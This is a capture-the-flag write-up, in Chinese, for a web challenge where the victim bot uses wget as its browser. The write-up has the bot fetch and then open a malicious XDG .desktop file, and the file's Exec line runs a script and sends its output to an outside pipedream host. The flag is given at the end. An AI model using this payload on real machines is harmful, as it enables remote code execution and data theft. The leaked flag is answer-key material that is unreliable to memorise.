網絡安全隱患
===

## Summary

* **Author:** Ozetta
* **Category:** Web, Pwn, ★☆☆☆☆

## Description

Web: {CHAL_URL_LINK}

Attachment: {ATTACHMENT_LINK}


（以下爲 DeepL 翻譯）
如果有人用 wget 作為瀏覽器怎麼辦？
旗幟：在根目錄中找到名稱為 `/proof*.sh` 的旗幟

---

* 這個挑戰的目的是發送一個惡意的網頁/URI來竊取敏感信息，甚至在受害者的機器上執行任意代碼。與XSS不同的是，XSS的影響僅限於受害者在特定網站上的賬戶，而瀏覽器/桌面應用程序的利用，或一般的客戶端攻擊，可能會損害整個受害者的機器。

* 在這個挑戰中，我們可以向受害者發送一個任意的URI，他們將用 `xdg-open` 打開它（就像在瀏覽器中點擊超連結一樣）。為了欺騙受害者執行任意代碼，我們可以製作一個XDG Desktop Entry，它可以指定要執行的命令。

* 但在我們欺騙受害者打開 Desktop Entry 之前，我們需要將桌面條目寫入本地文件系統的某個地方。正因受害者使用 `wget` 作為瀏覽器，而當前工作目錄是可寫的。

* 例如，你可以上傳一個名為`example.desktop`的 Desktop Entry 文件到你的網站（例如Github頁面），然後要求受害者機器人下載它
```
[Desktop Entry]
Exec=sh -c "wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?`/proof*.sh`"
Type=Application
```
 * 如果這個 Desktop Entry 被打開，那麼它將執行 `Exec=` 之後的命令，亦即首先執行 `/proof*.sh` 獲得輸出，並執行 `wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?(執行 /proof*.sh 獲得的輸出)`，從而捕獲旗幟

* 一旦寫好了 `example.desktop` 文件，你可以要求受害者機器人打開 `file:///tmp/example.desktop` ，這樣他們就會執行你之前植入的代碼
  * 但要確保你為不同 Desktop Entry 文件使用不同的文件名，因為挑戰平台對每個參與者都是通用的

* 對你來說太容易了？現在你可以試試 babyURIi...

## Flag

`hkcert21{Infant_Browser_flag_153283eeddd3002f}`